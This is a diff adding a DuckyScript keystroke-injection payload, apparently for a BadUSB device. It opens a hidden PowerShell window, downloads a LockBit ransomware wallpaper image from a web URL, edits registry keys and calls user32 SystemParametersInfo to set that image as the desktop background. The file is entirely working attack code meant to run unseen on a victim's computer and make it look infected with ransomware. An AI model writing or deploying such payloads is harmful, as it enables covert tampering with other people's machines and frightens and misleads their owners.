@@ -1,0 +1,40 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden
+ENTER
+DELAY 500
+
+REM Start actual script
+STRING $i='https://cyble.com/wp-content/uploads/2021/08/Cyble-LOCKBIT-Ransomware-Windows-darkweb-LOCKBIT-2.0-Changing-Desktop-Background.png';
+ENTER
+STRING $u=$env:USERNAME;
+ENTER
+STRING $p="C:\Users\$u\Pictures\dl.jpg";
+ENTER
+STRING Invoke-WebRequest -Uri $i -OutFile $p;
+ENTER
+STRING Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Wallpapers' -Name BackgroundType -Value 1;
+ENTER
+STRING Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value $p;
+ENTER
+STRING Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name WallpaperStyle -Value 2;
+ENTER
+STRING Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name TileWallpaper -Value 0;
+ENTER
+STRING Add-Type -TypeDefinition @"
+ENTER
+STRING using System;
+ENTER
+STRING using System.Runtime.InteropServices;
+ENTER
+STRING public class W {
+ENTER
+STRING [DllImport("user32.dll")] public static extern int SystemParametersInfo(int a, int b, string c, int d);
+ENTER
+STRING }
+ENTER
+STRING "@;
+ENTER
+STRING [W]::SystemParametersInfo(20, 0, $p, (0x01 -bor 0x02));
+ENTER
